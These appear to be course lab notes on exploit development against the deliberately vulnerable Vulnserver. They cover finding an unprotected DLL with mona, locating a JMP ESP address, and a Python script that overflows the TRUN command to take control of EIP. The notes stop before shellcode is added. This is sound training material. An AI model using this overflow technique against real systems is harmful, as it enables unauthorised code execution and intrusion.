# Finding the Right Module

We are looking for a dll inside the program, that has no memory protections: no DEP, no ASLR, no safeSEH

Can use Mona Modules tool together with ImmunityDebugger

Download mona.py and place in:
```
C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands
```

In Immunity Debugger where our program has paused, run at the bottom cmd line, `!mona modules`

We can check which protection settings are off and on

Check what is attached to vulnserver itself and has all False

![](https://github.com/Cyberd0xed/practical-ethical-hacking/blob/main/resources/f4ade174ab3d428e97f16a8f06d1092f.png?raw=true)
 
**essfunc.dll** seems ideal as the protection settings for Rebase, SafeSEH, ASLR, NXCompat, OS Dll are all False and it is attached to the vulnserver process (`\vulnserver\essfunc.dll`)

Find the operation (OP) code equivalents of a jump to a specific address: i.e. trying to convert assembly language to shellcode

How to do this: go on Linux, and `locate nasm_shell`

Run
```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```
On `nasm>` type the assembly code `JMP ESP`. We get:
```
nasm > JMP ESP
00000000  FFE4              jmp esp
```
will use this as a pointer for our program to look at the pointer and jump to the shell code 

Hexcode equivalent of "JMP ESP" is "FFE4"

Go back to ImmunityDebugger and type:
```
!mona find -s "\xff\xe4" -m eesfunc.dll
```
(`.ff..e4`)
In the results, we see a couple of return addresses

![](https://github.com/Cyberd0xed/practical-ethical-hacking/blob/main/resources/527a2a8a950648e0a813ed38b3703070.png?raw=true)

Note down some of these. For now, first result: `0x625011af`

We will use this in our shell code. This time, our Windows has x86 architecture so we need to use little-endian format as it stores the lower order byte to the lowest address and the high order byte at the higher address.
We will write the address as `\xaf\x11\x50\x62`

We want our EIP to be jump code that jumps to our malicious reverse shell code:
```
#!/usr/bin/python
import sys, socket

# The "vulnerable" return address we found was 625011af
shellcode = "A" * 2003 + "\xaf\x11\x50\x62"

while True:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('10.0.2.15',9999))
		s.send(('TRUN /.:/' + shellcode ))
		s.close()
	except:
		print "Error connecting to server"
		sys.exit()
```

This should hit the same error as before but hit a Jump point 

Go back to ImmunityDebugger and try and catch the exception
Back to "C" windows of ID, click blue/black arrow pointing to the right three dots and enter our address `Enter expression to follow 625011af`

![](https://github.com/Cyberd0xed/practical-ethical-hacking/blob/main/resources/11bcc55c6f2a4d1993abc116800e94c5.png?raw=true)

There, we see the FFE4 JMP ESP code we were looking for. Hit F2 to set breakpoint. Then, when we run the program, it will pause there instead of moving further. 
Can now run program and then run our 5.py
The program pauses at our breakpoint and we see `EIP 625011AF essfunc.625011AF`

We now control the EIP. Now need to write/generate some shellcode, point directly to that shellcode and get root

